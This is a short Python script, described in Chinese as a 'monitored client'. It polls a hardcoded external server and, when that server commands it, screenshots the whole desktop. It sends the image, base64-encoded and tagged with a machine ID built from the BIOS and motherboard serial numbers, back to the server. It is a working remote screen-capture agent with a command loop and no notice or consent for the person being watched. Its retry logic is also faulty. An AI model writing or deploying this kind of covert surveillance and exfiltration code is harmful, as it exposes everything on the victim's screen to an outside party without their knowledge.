"""
被监控的客户端，需要获取如下信息:
01 主板序列号/BIOS序列号 生成机器码
02 实时截图
"""

from wmi import WMI
from PIL import ImageGrab
from base64 import b64encode
from requests import post
from time import sleep

url = 'http://47.100.219.163:20240'
#url = 'http://127.0.0.1:1024'
save_path = 'd:/1.jpg'



def serial_number():
    bios = WMI().Win32_BIOS()[0]
    board = WMI().Win32_BaseBoard()[0]
    return bios.SerialNumber+board.SerialNumber


def screen_shot(save_path):
    image = ImageGrab.grab()
    image.save(save_path)
    image = b64encode(open(save_path,'rb').read())
    return image

def main():
    data = {
        'transferType' : 'heartBeat'
    }
    try:
        r = post(url,data).text
    except:
        main()
    receive_data = r

    if receive_data == 'screenShot':
        image = screen_shot(save_path)
        serialNumber = serial_number()
        post_data = {
            'serialNumber' : serialNumber,
            'image' : image,
            'transferType' : 'sendImage'
        }
        print('---成功截屏---')
        post(url,post_data)

if __name__ == '__main__':
    while True:
        main()
        sleep(0.2)